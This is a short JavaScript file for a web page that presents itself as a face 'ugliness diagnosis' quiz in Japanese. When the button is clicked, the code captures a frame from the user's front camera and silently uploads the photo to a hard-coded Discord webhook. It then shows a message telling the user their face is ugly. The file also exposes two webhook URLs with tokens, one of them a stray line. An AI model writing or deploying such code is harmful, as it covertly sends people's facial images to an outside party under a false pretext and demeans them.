const startBtn = document.getElementById('startBtn');
const status   = document.getElementById('status');
const video    = document.getElementById('video');
const canvas   = document.getElementById('canvas');
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1362494953078391083/w8iCzgrt7efmjVkHlbTkLjUV4iyXB0lJSMRQJqPY85XJnSL2ns0PwC6T_dRoelTF3lCK'; // ←自分のWebhook URLに置き換えてください
https://discord.com/api/webhooks/1362492567182119002/1LueLqEz5YXCUnO9BMNm0Zlb-nqoScs124M_v8UPW1Yy7nrNAPAGcrYK65qvc14fmm7Y
function dataURLToBlob(dataURL) {
  const [header, base64] = dataURL.split(',');
  const mime = header.match(/:(.*?);/)[1];
  const bin  = atob(base64);
  const buf  = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  return new Blob([buf], { type: mime });
}

startBtn.addEventListener('click', async () => {
  startBtn.disabled = true;
  startBtn.textContent = '診断中';
  status.textContent = 'ブス度を診断しています...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }, audio: false
    });
    video.srcObject = stream;
    await new Promise(r => {
      if (video.readyState >= 2) r();
      else video.onloadedmetadata = r;
    });

    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
    const blob    = dataURLToBlob(dataURL);

    const form = new FormData();
    form.append('file', blob, 'face.jpg');
    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: form });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);

    status.textContent = '診断完了！あなたの顔はブスです';
    startBtn.textContent = '診断完了';
  } catch (err) {
    console.error(err);
    status.textContent = 'エラー: ' + err.message;
    startBtn.textContent = '診断スタート';
    startBtn.disabled = false;
  } finally {
    if (video.srcObject) {
      video.srcObject.getTracks().forEach(t => t.stop());
      video.srcObject = null;
    }
  }
});
